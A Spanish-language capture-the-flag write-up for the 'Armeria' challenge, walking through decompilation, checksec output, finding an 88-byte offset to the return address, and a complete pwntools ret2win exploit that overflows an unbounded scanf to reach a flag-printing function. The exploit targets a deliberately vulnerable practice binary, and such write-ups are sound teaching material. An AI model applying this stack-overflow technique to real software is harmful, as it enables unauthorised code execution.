---
title: "Armeria"
date: "2025-10-17"
tags: ["NavajaNegra", "ret2win"]
---

En este ejercicio nos dan un binario que hace lo siguiente:

```c
PWN/nn/armeria ❯ ./Armeria                                                                                                                                                            3.13.7  20:38 
╔══════════════════════════════════════════════════════════════╗
║                        ◣ ARMERIA ◢                           ║
║                                                              ║
║    Hasta la herramienta más simple puede volverse mortal     ║
║     en las manos adecuadas. Demuestra tu destreza:           ║
║     salta donde otros temen y haz brillar la hoja negra.     ║
╚══════════════════════════════════════════════════════════════╝

Existen multitud de tipos de armas cuerpo a cuerpo, adivina mi favorita.
hola
No sé ni cuál es esa.
```

Simplemente nos dejan enviar información y nos devuelve un mensaje. Vamos a mirar cómo nos recoge esa información con `radare2`:

```c
pdg @ main
. . .
sym.imp.__isoc99_scanf(0x4023b1,&stack0xffffffffffffffa8);
. . .

ps @ 0x4023b1
%s
```

Como podemos ver solo se le indica el formato pero no la cantidad de bytes a leer con lo cual hay un Buffer Overflow. Si miramos las funciones podemos ver de paso que hay una función win:

```c
afl
. . .
0x004011e6    1     77 sym.banner
0x00401262    7    169 sym.win # WIN
0x00401130    1      1 sym._dl_relocate_static_pie
. . .
```

Vamos a darle un vistazo a ver si necesita argumentos o algo especial:

```c
pdg @ sym.win

void sym.win(void)

{
    int64_t iVar1;
    uchar *puVar2;
    ulong uStack_120;
    uchar auStack_118 [256];
    int64_t iStack_18;
    int64_t iStack_10;
    
    *(*0x20 + -0x120) = 0x40127c;
    iStack_10 = sym.imp.fopen("/flag.txt",0x40234c);
    if (iStack_10 == 0) {
        *(&stack0xfffffffffffffee8 + -8) = 0x401291;
        sym.imp.perror("flag.txt");
    }
    else {
        *(&stack0xfffffffffffffee8 + -8) = 0x4012b1;
        sym.imp.setvbuf(_reloc.stdout,0,2,0);
        puVar2 = &stack0xfffffffffffffee8;
        while( true ) {
            iVar1 = iStack_10;
            *(puVar2 + -8) = 0x4012f2;
            iStack_18 = sym.imp.fread(&stack0xfffffffffffffee8,1,0x100,iVar1);
            if (iStack_18 == 0) break;
            iVar1 = iStack_18;
            *(puVar2 + -8) = 0x4012d2;
            sym.imp.fwrite(&stack0xfffffffffffffee8,1,iVar1,_reloc.stdout);
            puVar2 = puVar2 + -8 + 8;
        }
        iVar1 = iStack_10;
        *(puVar2 + -8) = 0x401309;
        sym.imp.fclose(iVar1);
    }
    return;
}
```

Simplemente imprime la flag sin necesitar nada. Vamos a comprobar si `PIE` o `Canary` está activado, lo cual nos puede perjudicar el `ret2win`.

```c
pwndbg> checksec
File:     /home/ub1cu0/Escritorio/PWN/nn/armeria/Armeria
Arch:     amd64
RELRO:      Partial RELRO
Stack:      No canary found
NX:         NX enabled
PIE:        No PIE (0x400000)
Stripped:   No
```

No es el caso. El último dato que nos falta para poder hacer el exploit es el offset de nuestro input hasta el RIP. Vamos a sacarlo con `pwndbg`:

```c
cyclic
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa

 RBP  0x616161616161616b ('kaaaaaaa')
 RSP  0x7fffffffd4a8 ◂— 'laaaaaaamaaa' // Aquí
 RIP  0x4013b9 (main+174) ◂— ret 
 
 
pwndbg> cyclic -l laaaaaaa
Finding cyclic pattern of 8 bytes: b'laaaaaaa' (hex: 0x6c61616161616161)
Found at offset 88 // Offset
```

> Como estamos en x64 y no x32 tal vez de mirar el RIP hay que mirar los primeros 8 bytes del RSP.

Ahora que tenemos todo ya podemos hacer el exploit:

```python
#!/usr/bin/env python3

from pwn import *
import sys

exe = ELF("./Armeria_patched")

context.binary = exe
context.terminal = ['kitty']
gdb_script = '''
b main
continue
'''

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r, gdbscript=gdb_script)
        return r
    return remote("ADDR", PORT)

def main():
    io = conn()
    
    offset = 88
    ret = 0x0000000000401016

    payload = flat({
        offset: [
            ret, # En remoto hace falta porque en remoto el stack queda desalineado
            exe.sym["win"]
        ]
    })
    
    io.recvuntil(b"Existen multitud de tipos de armas cuerpo a cuerpo, adivina mi favorita.\n")
    io.sendline(payload)

    io.interactive()

if __name__ == "__main__":
    main()
```

```c
python3 solve.py LOCAL                                                                                                                                               3.13.7  22:09 
[*] '/home/ub1cu0/Escritorio/PWN/nn/armeria/Armeria'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
[+] Starting local process '/home/ub1cu0/Escritorio/PWN/nn/armeria/Armeria': pid 69057
[*] Switching to interactive mode
No sé ni cuál es esa.
Brr Brr Patapím!
[*] Got EOF while reading in interactive
```

¡Funciona! Gracias por leer.